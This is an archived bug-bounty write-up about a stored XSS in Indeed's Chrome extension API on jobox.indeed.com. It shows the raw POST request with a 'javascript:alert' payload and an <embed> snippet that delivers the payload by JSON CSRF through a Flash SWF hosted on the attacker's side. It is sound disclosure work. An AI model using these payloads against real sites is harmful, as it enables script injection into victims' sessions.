---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-01-17_1800-in-less-than-an-hour.md
original_filename: 2018-01-17_1800-in-less-than-an-hour.md
title: $1800 in less than an hour.
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
- api-security
- supply-chain
language: en
raw_sha256: 45301034681a84475679d384eb95cd5faa3afa411aa4ea9d1790814d462511b1
text_sha256: 4b3506555f4a5437215a325eb725c928ca33b5f41029998a6b920ae516a791c1
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# $1800 in less than an hour.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-01-17_1800-in-less-than-an-hour.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf, api-security, supply-chain
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `45301034681a84475679d384eb95cd5faa3afa411aa4ea9d1790814d462511b1`
- Text SHA256: `4b3506555f4a5437215a325eb725c928ca33b5f41029998a6b920ae516a791c1`


## Content

---
title: "$1800 in less than an hour."
page_title: "$1800 in less than an hour. ~ Random stuff by yappare"
url: "http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html"
final_url: "https://blog.yappare.com/2018/01/1800-in-less-than-hour.html"
authors: ["yappare (@yappare)"]
programs: ["Indeed"]
bugs: ["CSRF", "XSS"]
bounty: "1,800"
publication_date: "2018-01-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6007
---

##  [$1800 in less than an hour.](https://blog.yappare.com/2018/01/1800-in-less-than-hour.html)

on [January 17, 2018](https://blog.yappare.com/2018/01/1800-in-less-than-hour.html "permanent link") in [BugBounty](https://blog.yappare.com/search/label/BugBounty), [Tricks](https://blog.yappare.com/search/label/Tricks), [XSS](https://blog.yappare.com/search/label/XSS) [ No comments ](https://www.blogger.com/comment/fullpage/post/4407724975340972338/6848029175472254224) [ ![](//img2.blogblog.com/img/icon18_edit_allbkg.gif) ](https://www.blogger.com/post-edit.g?blogID=4407724975340972338&postID=6848029175472254224&from=pencil "Edit Post")

Sometimes, visiting an old program is gold.  
  
October, 2017. I just finished writing up my report and while waiting the report ready for QA process, I visited one of my favourite program in Bugcrowd, [Indeed.com](https://bugcrowd.com/indeed)  
  
I noted that the program went public and also the reward had been increased. Since it went public plus with a wide-scope targets, as I'm expecting, the vulnerabilities found must be huge.  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdoeg7CypIpWA18A5qD8HYtq_AMHgPzZfQENEkJMqRPkJRsBQfXQFZpPjymLjBntocgTbGrITsN8OxryRgpUIOHWXuBbqgG-BG5cT_pbQS_1cT6AfUXPOg3fVl7iyw3xj-4I8CoxbBLfk/s400/Screen+Shot+2018-01-18+at+11.22.04+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdoeg7CypIpWA18A5qD8HYtq_AMHgPzZfQENEkJMqRPkJRsBQfXQFZpPjymLjBntocgTbGrITsN8OxryRgpUIOHWXuBbqgG-BG5cT_pbQS_1cT6AfUXPOg3fVl7iyw3xj-4I8CoxbBLfk/s1600/Screen+Shot+2018-01-18+at+11.22.04+AM.png)

[  
](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdoeg7CypIpWA18A5qD8HYtq_AMHgPzZfQENEkJMqRPkJRsBQfXQFZpPjymLjBntocgTbGrITsN8OxryRgpUIOHWXuBbqgG-BG5cT_pbQS_1cT6AfUXPOg3fVl7iyw3xj-4I8CoxbBLfk/s1600/Screen+Shot+2018-01-18+at+11.22.04+AM.png)

That was not an issue at all. If you guys following the tips given through my presentations in Levelup, ChCon or Bsides NZ, one of the way that I usually will look at is 'less-participant' target. As the targets are inclusive ***.indeed.com/*,** I tried to find any available browser's extension by Indeed.com..There's one for Chrome :)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDxzJpboVkal-mOpezIM6ZmJRkieyZiHG6uQu4_fiPSKsbBwX4HNcQrRXEZjQbCIiqiXU8o0Y6a7FKF3DRjY2kQjYgdnKyZHShfj0OjcpJAcuqKew4AbZBws2jCmBR4qGLq70yJvxtOrs/s400/Screen+Shot+2018-01-18+at+11.32.08+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDxzJpboVkal-mOpezIM6ZmJRkieyZiHG6uQu4_fiPSKsbBwX4HNcQrRXEZjQbCIiqiXU8o0Y6a7FKF3DRjY2kQjYgdnKyZHShfj0OjcpJAcuqKew4AbZBws2jCmBR4qGLq70yJvxtOrs/s1600/Screen+Shot+2018-01-18+at+11.32.08+AM.png)

  

Not really expert in identifying vulnerability in browser's extension, so I poked around people in **bugbountyforum.slack.com** asking for some guides. 

  

Installed the extension in Chrome. Checked on the scripts used in this extension, not many joys. Turned my BurpSuite to see how's the extension being used and found that it is possible for a straight forward self-stored xss which will be executed under **jobox.indeed.com** domain

> 
>  POST /api/jobApplication? HTTP/1.1
>  Host: jobox.indeed.com
>  Connection: close
>  Content-Length: 117
>  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
>  Content-Type: application/json
>  Accept: */*
>  Accept-Encoding: gzip, deflate
>  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
>  Cookie: INDEED_CSRF_TOKEN=token
>  
>  {"status":"WISHLIST","url":"javascript:alert(0)","notes":"test","jobTitle":"test","companyName":"texst","userId":"1"}

Self-XSS might not be rewarded. So, one of the way to exploit it is via CSRF attack. What a luck, the CSRF-Token was not properly validated. Knowing the CSRF was not effective plus the response was in JSON, I remembered that there's a blog mentioned it is possible to perform CSRF attack even the response is in JSON - <https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/>. Also, thanks to the tool created by [sp1d3r](https://github.com/sp1d3r/swf_json_csrf/blob/master/README.md), the exploiting process was easier.  
  
Put all of them in one HTML request,  
  
<embed src='http[s]://[yourhost-and-path]/test.swf?jsonData={"status":"WISHLIST","url":"javascript:alert(document.domain)","notes":"test","jobTitle":"test","companyName":"test"}&php_url=http[s]://[yourhost-and-path]/test.php&endpoint=https://jobox.indeed.com/api/jobApplication?></embed>  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmaZcZSfCViXE2ojjHQ268ojvETs4D85OA7EGtI35uzbxPbS_vyKWbgQ_RddKmeTAAnWwY51MlRb2cozst5FtXcNjxyVezSkZZc0OWpAV1JwdmiLin3vkvt1t2N9d1YGOxBBwGgK4IVes/s400/Screen+Shot+2018-01-18+at+11.45.15+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmaZcZSfCViXE2ojjHQ268ojvETs4D85OA7EGtI35uzbxPbS_vyKWbgQ_RddKmeTAAnWwY51MlRb2cozst5FtXcNjxyVezSkZZc0OWpAV1JwdmiLin3vkvt1t2N9d1YGOxBBwGgK4IVes/s1600/Screen+Shot+2018-01-18+at+11.45.15+AM.png)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWT4Ewjk9eJrzQA-dSm1eSIPKmw7UhJ_-VlGNtqvSdwhEv304TTcVK8vejuw5a_wTm9V5aOf9Podiogqb8N_rJhyphenhyphentx3cRmQIRHMmEccXJxvWfPLEcnz4RW8HHLHjBHFZiGQfM5CNmSNIg/s640/Screen+Shot+2018-01-18+at+11.46.09+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWT4Ewjk9eJrzQA-dSm1eSIPKmw7UhJ_-VlGNtqvSdwhEv304TTcVK8vejuw5a_wTm9V5aOf9Podiogqb8N_rJhyphenhyphentx3cRmQIRHMmEccXJxvWfPLEcnz4RW8HHLHjBHFZiGQfM5CNmSNIg/s1600/Screen+Shot+2018-01-18+at+11.46.09+AM.png)

  
The reward was spent for my holiday trip in December..all thanks to the 1 hour effort spent in the program :D  
  
Thanks.

Share: [__](https://www.facebook.com/share.php?v=4&src=bm&u=https://blog.yappare.com/2018/01/1800-in-less-than-hour.html&t=$1800 in less than an hour. "Share this on Facebook")[__](https://twitter.com/home?status=$1800 in less than an hour. -- https://blog.yappare.com/2018/01/1800-in-less-than-hour.html "Tweet This!")[__](https://plus.google.com/share?url=https://blog.yappare.com/2018/01/1800-in-less-than-hour.html "Share this on Google+")[__](https://pinterest.com/pin/create/button/?source_url=&media=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhdoeg7CypIpWA18A5qD8HYtq_AMHgPzZfQENEkJMqRPkJRsBQfXQFZpPjymLjBntocgTbGrITsN8OxryRgpUIOHWXuBbqgG-BG5cT_pbQS_1cT6AfUXPOg3fVl7iyw3xj-4I8CoxbBLfk/s400/Screen+Shot+2018-01-18+at+11.22.04+AM.png&description=$1800 in less than an hour. "Share on Pinterest")[__](https://www.linkedin.com/shareArticle?mini=true&title=$1800 in less than an hour.&url=https://blog.yappare.com/2018/01/1800-in-less-than-hour.html "Share this on Linkedin")

[Email This](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=6848029175472254224&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=6848029175472254224&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=6848029175472254224&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4407724975340972338&postID=6848029175472254224&target=facebook "Share to Facebook")
